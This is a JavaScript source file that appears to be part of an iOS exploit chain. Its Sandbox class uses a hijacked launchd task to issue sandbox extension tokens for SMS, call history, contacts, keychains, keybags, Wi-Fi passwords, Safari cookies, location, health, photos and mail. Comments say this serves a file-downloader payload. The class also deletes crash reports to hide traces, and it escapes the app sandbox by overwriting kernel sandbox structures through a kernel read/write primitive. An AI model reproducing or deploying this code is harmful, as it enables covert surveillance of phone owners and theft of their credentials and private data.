import FileUtils from "libs/JSUtils/FileUtils";
import Utils from "libs/JSUtils/Utils";
import Task from "./Task";
import RemoteCall from "./RemoteCall";
import Chain from "libs/Chain/Chain";
import Native from "libs/Chain/Native";

const TAG = "SANDBOX";

export default class Sandbox {

	static #launchdTask = null;
	static #PathDictionary = {
		// Communications
		"/private/var/mobile/Library/AddressBook/":0,
		"/private/var/mobile/Library/CallHistoryDB/":0,
		"/private/var/mobile/Library/DoNotDisturb/":0,
		"/private/var/mobile/Library/SMS/":0,
		"/private/var/mobile/Library/Calendar/":0,
		"/private/var/mobile/Library/Mail/":0,
		"/private/var/mobile/Library/Voicemail/":0,
		"/var/mobile/Library/Recordings":0,
		
		// Location
		"/private/var/root/Library/Caches/locationd":0,
		"/private/var/root/Library/Caches/locationd/":0,
		"/private/var/mobile/Library/Caches/locationd/":0,
		"/private/var/mobile/Library/Caches/com.apple.routined/":0,
		
		// Browser & Cookies
		"/private/var/mobile/Library/Safari/":0,
		"/private/var/mobile/Library/Cookies/":0,
		"/private/var/mobile/Cookies/":0,
		
		// Credentials & WiFi
		"/private/var/Keychains/":0,
		"/var/Keychains/":0,
		"/private/var/keybags/":0,
		"/var/keybags/":0,
		"/private/var/keybags/systembag.kb":0,
		"/private/var/keybags/persona.kb":0,
		"/private/var/keybags/usersession.kb":0,
		"/private/var/keybags/backup/":0,
		"/var/keybags/":0,
		"/var/keybags/systembag.kb":0,
		"/var/keybags/persona.kb":0,
		"/var/keybags/usersession.kb":0,
		"/var/keybags/backup/":0,
		"/var/keybags/backup/backup_keys_cache.sqlite":0,
		"/private/var/preferences/com.apple.wifi.known-networks.plist":0,
		"/private/var/preferences/SystemConfiguration/":0,
		"/private/var/preferences/SystemConfiguration/preferences.plist":0,
		"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist":0,
		"/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist":0,
		"/private/var/networkd/db/":0,
		"/var/wireless/":0,
		"/private/var/wireless/":0,
		"/var/wireless/Library/":0,
		"/var/wireless/Library/Caches/":0,
		"/var/wireless/Library/Preferences/":0,
		"/var/wireless/Library/Databases/":0,
		"/var/wireless/Library/ControlCenter/":0,
		"/private/var/wireless/Library/":0,
		"/private/var/wireless/Library/Preferences/":0,
		"/private/var/wireless/Library/Databases/":0,
		"/private/var/wireless/Library/ControlCenter/":0,
		"/private/var/mobile/Library/CoreDuet/":0,
		"/private/var/mobile/Library/CoreDuet/People/":0,
		"/private/var/mobile/Library/PersonalizationPortrait/":0,
		"/var/log/":0,
		"/private/var/log/":0,
		"/var/db/":0,
		"/private/var/db/":0,
		"/var/run/":0,
		"/private/var/run/":0,
		
		// Personal Data
		"/private/var/mobile/Library/Notes/":0,
		"/private/var/mobile/Library/Health/":0,
		"/private/var/mobile/Media/":0,
		"/private/var/mobile/Media/PhotoData/":0,
		"/private/var/mobile/Media/DCIM/":0,
		"/var/mobile/Media/":0,
		"/var/mobile/Media/PhotoData/":0,
		"/var/mobile/Media/DCIM/":0,
		
		// Device Info
		"/private/var/root/Library/Lockdown/":0,
		"/private/var/mobile/Library/Preferences/":0,
		"/private/var/mobile/Library/Preferences/com.apple.commcenter.shared.plist":0,
		"/private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist":0,
		
		// Accounts
		"/private/var/mobile/Library/Accounts/":0,
		
		// Protected & Trust
		"/private/var/protected/trustd/private/":0,
		"/private/var/protected/trustd/private":0,
		
		// System & Apps
		"/bin/":0,
		"/Applications/":0,
		"/private/var/containers/Bundle/Application/":0,
		"/var/containers/Bundle/Application/":0,
		"/private/var/containers/Shared/SystemGroup/":0,
		"/private/var/mobile/Containers/Data/Application/":0,
		"/var/mobile/Containers/Data/Application/":0,
		"/private/var/mobile/Containers/Shared/AppGroup/":0,
		
		// Notifications & Logs
		"/private/var/mobile/Library/UserNotificationsUI/NotificationListPersistentState.json":0,
		"/private/var/mobile/Library/UserNotifications/":0,
		"/private/var/mobile/Library/Logs/CrashReporter/":0,
		"/private/var/mobile/Library/ExternalAccessory":0,
		"/private/var/mobile/Library/Shortcuts/":0,
		
		// Temp directory for file operations
		"/private/var/tmp/":0,
		"/tmp/":0
		/* not allowed via launchd
		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db":0,
		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db-wal":0,
		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db-shm":0
		*/
	};

	static initWithLaunchdTask(launchdTask) {
		this.#launchdTask = launchdTask;
	}

	static getTokenForPath(path, consume=false)
	{

		if (!this.#launchdTask || !this.#launchdTask.success())
			return;

		//console.log(TAG,`Creating token for path:${path}`);
		let memRemote = this.#launchdTask.mem();
		let pathRemote = memRemote;
		this.#launchdTask.writeStr(pathRemote,path);
		let appSandboxReadExt = "com.apple.app-sandbox.read-write";
		let sandboxExtensionEntry = memRemote + 0x100n;
		this.#launchdTask.writeStr(sandboxExtensionEntry,appSandboxReadExt);
		let tokenRemote = this.#launchdTask.call(100, "sandbox_extension_issue_file",sandboxExtensionEntry,pathRemote,0n,0n);
		if (!tokenRemote) {
			console.log(TAG, "Unable to create token for: " + path);
			return null;
		}
		//console.log(TAG,`token:${Utils.hex(tokenRemote)}`);
		let token = Native.mem;
		this.#launchdTask.read(tokenRemote,token,512n);
		if(consume)
			Native.callSymbol("sandbox_extension_consume",token);
		token = Native.readString(token,512);
		//console.log(TAG,`token:${token}`);
		if(!token || !token.includes("com.apple.app-sandbox.read-write"))
		{
			console.log(TAG,`Found weird token:${token}, not registering`);
			return null;
		}
		return token;
	}

	static createTokens()
	{
		console.log(TAG, "Create tokens...");
		let keys = Object.keys(this.#PathDictionary);
		for(let key of keys)
			this.#PathDictionary[key] = this.getTokenForPath(key,false);

		// Those are required for Bailer
		//if (!this.#weAreLaunchd) {
			this.getTokenForPath("/bin/", true);
			this.getTokenForPath("/Applications/", true);
			this.getTokenForPath("/private/var/tmp/", true);
			this.getTokenForPath("/tmp/", true);
			this.getTokenForPath("/private/var/mobile/Media/", true);
			this.getTokenForPath("/private/var/mobile/Containers/Data/Application/", true);
			this.getTokenForPath("/var/mobile/Containers/Data/Application/", true);
			this.getTokenForPath("/private/var/mobile/Containers/Shared/AppGroup/", true);
			this.getTokenForPath("/private/var/containers/Bundle/Application/", true);
			this.getTokenForPath("/var/containers/Bundle/Application/", true);
			this.getTokenForPath("/private/var/containers/Shared/SystemGroup/", true);
			this.getTokenForPath("/private/var/preferences/SystemConfiguration/preferences.plist", true);
			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3", true);
			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-wal", true);
			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-shm", true);
		//}
		
		// Forensic file paths for file_downloader payload
		console.log(TAG, "Create tokens for forensic paths...");
		this.getTokenForPath("/private/var/mobile/Library/SMS/", true);
		this.getTokenForPath("/private/var/mobile/Library/CallHistoryDB/", true);
		this.getTokenForPath("/private/var/mobile/Library/AddressBook/", true);
		this.getTokenForPath("/private/var/mobile/Library/Voicemail/", true);
		
		// Keychain tokens (with /private prefix)
		this.getTokenForPath("/private/var/Keychains/", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db-shm", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db-wal", true);
		this.getTokenForPath("/private/var/Keychains/keychain-2.db-journal", true);
		
		// Keychain tokens (without /private prefix - alternate)
		this.getTokenForPath("/var/Keychains/", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db-shm", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db-wal", true);
		this.getTokenForPath("/var/Keychains/keychain-2.db-journal", true);
		
		// Keybag tokens (legacy location)
		this.getTokenForPath("/private/var/keybags/", true);
		this.getTokenForPath("/private/var/keybags/systembag.kb", true);
		this.getTokenForPath("/private/var/keybags/persona.kb", true);
		this.getTokenForPath("/private/var/keybags/usersession.kb", true);
		this.getTokenForPath("/private/var/keybags/backup/", true);
		
		// Keybag tokens (without /private - alternate)
		this.getTokenForPath("/var/keybags/", true);
		this.getTokenForPath("/var/keybags/systembag.kb", true);
		this.getTokenForPath("/var/keybags/persona.kb", true);
		this.getTokenForPath("/var/keybags/usersession.kb", true);
		this.getTokenForPath("/var/keybags/backup/", true);
		this.getTokenForPath("/var/keybags/backup/backup_keys_cache.sqlite", true);
		
		// Keybag tokens (Keychains directory - iOS 18)
		this.getTokenForPath("/private/var/Keychains/System.keybag", true);
		this.getTokenForPath("/private/var/Keychains/Backup.keybag", true);
		this.getTokenForPath("/private/var/Keychains/persona.kb", true);
		this.getTokenForPath("/private/var/Keychains/usersession.kb", true);
		this.getTokenForPath("/private/var/Keychains/device.kb", true);
		this.getTokenForPath("/var/Keychains/persona.kb", true);
		
		this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi.plist", true);
		this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist", true);
		this.getTokenForPath("/private/var/preferences/com.apple.wifi.known-networks.plist", true);
		
		// WiFi password file locations (for pickup from wifid)
		this.getTokenForPath("/var/wireless/", true);
		this.getTokenForPath("/private/var/wireless/", true);
		this.getTokenForPath("/private/var/wireless/Library/", true);
		this.getTokenForPath("/private/var/wireless/Library/Preferences/", true);
		this.getTokenForPath("/private/var/wireless/Library/Databases/", true);
		this.getTokenForPath("/private/var/wireless/Library/ControlCenter/", true);
		this.getTokenForPath("/private/var/mobile/Library/CoreDuet/", true);
		this.getTokenForPath("/private/var/mobile/Library/PersonalizationPortrait/", true);
		this.getTokenForPath("/var/log/", true);
		this.getTokenForPath("/private/var/log/", true);
		this.getTokenForPath("/var/db/", true);
		this.getTokenForPath("/private/var/db/", true);
		this.getTokenForPath("/var/run/", true);
		this.getTokenForPath("/private/var/run/", true);
		this.getTokenForPath("/private/var/networkd/", true);
		
		this.getTokenForPath("/private/var/mobile/Library/Safari/", true);
		this.getTokenForPath("/private/var/mobile/Library/Cookies/", true);
		this.getTokenForPath("/private/var/mobile/Library/Caches/locationd/", true);
		this.getTokenForPath("/private/var/root/Library/Caches/locationd/", true);
		this.getTokenForPath("/private/var/mobile/Library/Notes/", true);
		this.getTokenForPath("/private/var/mobile/Library/Calendar/", true);
		this.getTokenForPath("/private/var/mobile/Media/PhotoData/", true);
		this.getTokenForPath("/private/var/mobile/Media/DCIM/", true);
		this.getTokenForPath("/var/mobile/Media/", true);
		
		// iCloud Drive tokens
		this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/", true);
		this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/", true);
		this.getTokenForPath("/var/mobile/Media/PhotoData/", true);
		this.getTokenForPath("/var/mobile/Media/DCIM/", true);
		this.getTokenForPath("/private/var/mobile/Library/Health/", true);
		this.getTokenForPath("/private/var/root/Library/Lockdown/", true);
		this.getTokenForPath("/private/var/mobile/Library/Preferences/", true);
		this.getTokenForPath("/private/var/mobile/Library/Accounts/", true);
		this.getTokenForPath("/private/var/mobile/Library/Mail/", true);
		this.getTokenForPath("/private/var/mobile/Library/FrontBoard/", true);
	}

	static applyTokensForRemoteTask(remoteTask)
	{
		let remoteMem = remoteTask.mem();
		let keys = Object.keys(this.#PathDictionary);
		for(let key of keys)
		{
			if(this.#PathDictionary[key])
			{
				//console.log(TAG,`Applying:${this.#PathDictionary[key]}`);
				remoteTask.writeStr(remoteMem,this.#PathDictionary[key]);
				remoteTask.call(100,"sandbox_extension_consume",remoteMem);
				//console.log(TAG,`Result of consume:${resConsume}`);
			}
		}
	}

	static destroy()
	{
		if(this.#launchdTask)
			this.#launchdTask.destroy();
	}

	static deleteCrashReports()
	{
		this.getTokenForPath("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
		FileUtils.deleteDir("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
	}

	static adjustMemoryPressure(processName) {
		const MEMORYSTATUS_CMD_SET_JETSAM_HIGH_WATER_MARK = 5;
		const MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT = 6;
		const MEMORYSTATUS_CMD_SET_PROCESS_IS_MANAGED = 16;

		let pid = Task.pidof(processName);
		if (!pid) {
			console.log(TAG, "Unable to get pid of: " + processName);
			return;
		}

		if (!this.#launchdTask || !this.#launchdTask.success())
			return;

		let memResult = this.#launchdTask.call(100, "memorystatus_control",MEMORYSTATUS_CMD_SET_JETSAM_HIGH_WATER_MARK,pid,-1,0,0);
		console.log(TAG,`waterMark result: ${memResult}`);
		memResult = this.#launchdTask.call(100, "memorystatus_control",MEMORYSTATUS_CMD_SET_PROCESS_IS_MANAGED,pid,0,0,0);
		console.log(TAG,`isManaged result: ${memResult}`);
		memResult = this.#launchdTask.call(100, "memorystatus_control",MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT,pid,0,0,0);
		console.log(TAG,`taskLimit result: ${memResult}`);
	}
	static applySandboxEscape() {
		let _CS_DARWIN_USER_TEMP_DIR = 65537n;
		let write_file_path = Native.callSymbol("calloc", 1n, 1024n);
		Native.callSymbol("confstr", _CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024n);
		let randomHex = "/" + Utils.hex(Native.callSymbol("arc4random"));
		let randomHexPtr = Native.mem;
		Native.writeString(randomHexPtr, randomHex);
		Native.callSymbol("strcat", write_file_path, randomHexPtr);

		// mktmp should work
		// confstrr path
		// also in pe
		//let procPath = "/private/var/tmp/com.apple.mediaplaybackd/Library/HTTPStorages/com.apple.mediaplaybackd/"
		let appSandboxReadExt = "com.apple.app-sandbox.read-write";
		let extension = Native.callSymbol("sandbox_extension_issue_file",appSandboxReadExt,write_file_path,0n,0n);
		if (!extension) {
			console.log(TAG,`Sandbox failure 1`);
			return false;
		}
		let resConsume = Native.callSymbol("sandbox_extension_consume",extension);
		if (resConsume == -1) {
			console.log(TAG,`Sandbox failure 2`);
			return false;
		}
		let ourTaskAddr = Task.getTaskAddrByPID(Native.callSymbol("getpid"));
		console.log(TAG,`ourTaskAddr:${Utils.hex(ourTaskAddr)}`);
		let ourProcAddr = Task.getTaskProc(ourTaskAddr);
		console.log(TAG,`ourProcAddr:${Utils.hex(ourProcAddr)}`);
		let credRefAddr = Chain.read64(ourProcAddr + 0x18n);
		if (credRefAddr == 0n) {
			console.log(TAG,`Sandbox failure 3`);
			return false;
		}
		credRefAddr = credRefAddr + 0x28n;
		let credAddr = Chain.read64(credRefAddr);
		if (credAddr == 0n) {
			console.log(TAG,`Sandbox failure 4`);
			return false;
		}
		console.log(TAG,`credRefAddr:${Utils.hex(credRefAddr)}`);
		let labelAddr = Chain.read64(credAddr + 0x78n);
		if (labelAddr == 0n) {
			console.log(TAG,`Sandbox failure 5`);
			return false;
		}
		console.log(TAG,`labelAddr:${Utils.hex(labelAddr)}`);
		let sandboxAddr = Chain.read64(labelAddr + 0x8n + 1n * BigInt(Utils.UINT64_SIZE));
		if (sandboxAddr == 0n) {
			console.log(TAG,`Sandbox failure 6`);
			return false;
		}
		console.log(TAG,`sandboxAddr:${Utils.hex(sandboxAddr)}`);
		let ext_setAddr = Chain.read64(sandboxAddr + 0x10n);
		if (ext_setAddr == 0n) {
			console.log(TAG,`Sandbox failure 7`);
			return false;
		}
		console.log(TAG,`ext_setAddr:${Utils.hex(ext_setAddr)}`);
		let ext_tableAddr = ext_setAddr + 0x0n; // koffsetof(extension_set, ext_table) = 0x0
		let hash = 0n;
		console.log(TAG,`hash:${Utils.hex(hash)}`);
		//hash = 4n; // for read
		hash = 0n; // for read-write
		let ext_hdrAddr = Chain.read64(ext_tableAddr + hash * BigInt(Utils.UINT64_SIZE));
		if (ext_hdrAddr == 0n) {
			console.log(TAG,`Sandbox failure 8`);
			return false;
		}
		/*
		newHash = hashing_magic(appSandboxReadWriteExt);
		LOG("ext_hdrAddr:%llx",ext_hdrAddr);
		sleep(1);
		mach_vm_address_t nullAddr = 0;
		chain_write(ext_tableAddr + hash * sizeof(mach_vm_address_t),&nullAddr,sizeof(nullAddr));
		chain_write(ext_tableAddr + newHash * sizeof(mach_vm_address_t),&ext_hdrAddr,sizeof(ext_hdrAddr));
		*/
		for (;;) {
			let nextAddr = Chain.read64(ext_hdrAddr);
			if(nextAddr == 0n)
				break;
			ext_hdrAddr = nextAddr;
		}
		let ext_lstAddr = ext_hdrAddr + 0x8n; // koffsetof(extension_hdr, ext_lst) == 0x8
		let extAddr = Chain.read64(ext_lstAddr);
		if (extAddr == 0n) {
			console.log(TAG,`Sandbox failure 9`);
			return false;
		}
		console.log(TAG,`extAddr:${Utils.hex(extAddr)}`);
		let dataLength = Chain.read64(extAddr + 0x48n);
		let dataAddr = Chain.read64(extAddr + 0x40n);
		if(dataLength == 0n || dataAddr == 0n) {
			console.log(TAG,`Sandbox failure 10`);
			return false;
		}
		let pathLength = Native.callSymbol("strlen",write_file_path) + 1;
		console.log(TAG,`dataLength:${Utils.hex(dataLength)} pathLength:${Utils.hex(pathLength)}`);

		Chain.write8(dataAddr, 0);
		Chain.write64(extAddr + 0x48n,0n);

		console.log(TAG, `Finished succesfully`);

		return true;
	}
}
